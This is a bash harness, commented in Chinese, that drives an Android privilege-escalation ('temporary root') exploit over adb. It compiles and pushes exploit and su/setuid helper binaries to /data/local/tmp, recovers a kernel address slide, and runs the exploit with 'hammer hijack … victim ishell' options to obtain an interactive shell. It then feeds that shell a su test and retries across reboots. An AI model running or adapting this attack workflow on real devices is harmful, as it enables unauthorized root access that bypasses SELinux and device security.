#!/bin/bash
# round6.sh — A 方案(白名单授权点)的判定轮: reboot → 等负载 → 解 slide → 推 pr/sudbin/asuid/脚本
#            → ishell 喂 su_a_test.sh → 回读设备端日志
# 用法: bash cm57/round6.sh [最大轮数, 默认 3]
set -u
cd "/g/项目/Windows管理/usb/临时root" || exit 1
DEV=<DEVICE_SERIAL>
ADB="C:/adb/platform-tools/adb.exe"
A() { MSYS2_ARG_CONV_EXCL='*' "$ADB" -s "$DEV" "$@"; }
CL="J:/Users/Administrator/AppData/Local/Android/Sdk/ndk/27.3.13750724/toolchains/llvm/prebuilt/windows-x86_64/bin/aarch64-linux-android35-clang.cmd"
MAX=${1:-3}
TAG=$(date +%m%d_%H%M)
NOREBOOT=${NOREBOOT:-1}     # 1=第 1 轮允许复用当前干净 boot(省 4 分钟); NOREBOOT=0 强制冷启动
o=""

wait_load() {
  for i in $(seq 1 30); do
    l=$(A shell "cat /proc/loadavg" 2>/dev/null | tr -d '\r' | cut -d' ' -f1)
    ip=${l%%.*}; [ -n "$ip" ] || ip=9
    echo "[6] load1=$l (门槛 <6)"
    [ "$ip" -lt 6 ] && return 0
    sleep 15
  done
  return 1
}

echo "[6] 编译 $(date +%H:%M:%S)"
"$CL" -O2 -static -Wall -Wno-unused-result -o cm57/sudbin   cm57/sud.c   || exit 1
"$CL" -O2 -static -Wall -o cm57/asuidbin cm57/asuid.c || exit 1
"$CL" -O2 -g0 -fPIE -pie -pthread -Wall -Wno-unused-parameter -Wno-unused-function \
      -o cm57/prbin cm57/pr.c || exit 1
echo "[6] 编译完成"

for r in $(seq 1 "$MAX"); do
  echo "[6] ########## 第 $r/$MAX 轮 ########## $(date +%H:%M:%S)"
  {
    if [ "$NOREBOOT" = 1 ] && [ "$r" = 1 ] \
       && [ "$(A shell 'uname -s' 2>/dev/null | tr -d '\r')" = "Linux" ] \
       && [ "$(A shell 'getenforce' 2>/dev/null | tr -d '\r')" = "Enforcing" ]; then
      echo "[6] 第 1 轮跳过 reboot(本 boot 干净: 一发未打 + enforcing)⇒ 省 ~4 分钟"
      o=Enforcing
    else
      A reboot || exit 1
      A wait-for-device || exit 1
      for i in $(seq 1 40); do
        o=$(A shell "getenforce" 2>/dev/null | tr -d '\r')
        case "$o" in *Enforcing*|*Permissive*) break ;; esac
        sleep 5
      done
    fi
    echo "[6] shell 可用: $o uname=[$(A shell 'uname -s' | tr -d '\r')]"
    wait_load || { echo "[6] 负载不落定, 停"; exit 2; }

    python cm57/solve_only.py 30 > cm57/round6_${TAG}_r${r}_solve.log 2>&1
    S=$(grep -a 'SOLVE_ONLY_RESULT' cm57/round6_${TAG}_r${r}_solve.log | awk '{print $2}')
    echo "[6] slide=$S"
    if [ -z "$S" ] || [ "$S" = "NONE" ]; then echo "[6] 没解出 slide, 重来"; continue; fi
    wait_load || { echo "[6] 采样后负载没回落, 停"; exit 2; }
    U=$(A shell "uname -s" 2>/dev/null | tr -d '\r')
    echo "[6] 打之前 uname=[$U]"
    [ "$U" = "Linux" ] || { echo "[6] boot 不干净, 重来"; continue; }

    A push cm57/prbin    /data/local/tmp/pr      > /dev/null || exit 1
    A push cm57/sudbin   /data/local/tmp/sudbin  > /dev/null || exit 1
    A push cm57/asuidbin /data/local/tmp/asuid   > /dev/null || exit 1
    A push cm57/su_a_test.sh /data/local/tmp/su_a_test.sh   > /dev/null || exit 1
    A shell "chmod 755 /data/local/tmp/pr /data/local/tmp/sudbin /data/local/tmp/asuid /data/local/tmp/su_a_test.sh; rm -f /data/local/tmp/pr.log /data/local/tmp/su_a_test.log /data/local/tmp/su.audit /data/local/tmp/sud.log"
    echo "[6] dev md5: $(A shell 'md5sum /data/local/tmp/sudbin /data/local/tmp/asuid' | tr -d '\r' | tr '\n' ' ')"

    printf 'echo FED_LINE_OK; sh /data/local/tmp/su_a_test.sh; echo TEST_EXIT=$?; exit\n' | \
      A shell -tt "cd /data/local/tmp && ./pr $S hammer hijack shape2 sen victim ishell ph2=0 ncopy5 shots=25 maxr=8 nph=7 rounds=200 wcpu=6 mcpu=0 kids" \
      > cm57/round6_${TAG}_r${r}_run.log 2>&1
    echo "[6] ishell rc=$?"

    A wait-for-device || exit 1
    sleep 8
    A shell "cat /data/local/tmp/su_a_test.log" > cm57/round6_${TAG}_r${r}_test.log 2>&1
    A shell "cat /data/local/tmp/pr.log" > cm57/round6_${TAG}_r${r}_pr.log 2>&1
    echo "[6] 现场: $(A shell 'cat /proc/uptime; getenforce' | tr -d '\r' | tr '\n' ' ')"
    echo "[6] 测试日志行数=$(wc -l < cm57/round6_${TAG}_r${r}_test.log)"
    if grep -aq 'A方案判定 结束' cm57/round6_${TAG}_r${r}_test.log; then
      echo "[6] ★★★ 判定到手(第 $r 轮), 停 ★★★"
      break
    fi
    echo "[6] 第 $r 轮未到判定; pr.log 末尾:"
    tail -5 cm57/round6_${TAG}_r${r}_pr.log | tr -d '\r'
  } 2>&1 | tee "cm57/round6_${TAG}_r${r}_host.log"
done
echo "[6] 全部结束 $(date +%H:%M:%S)"
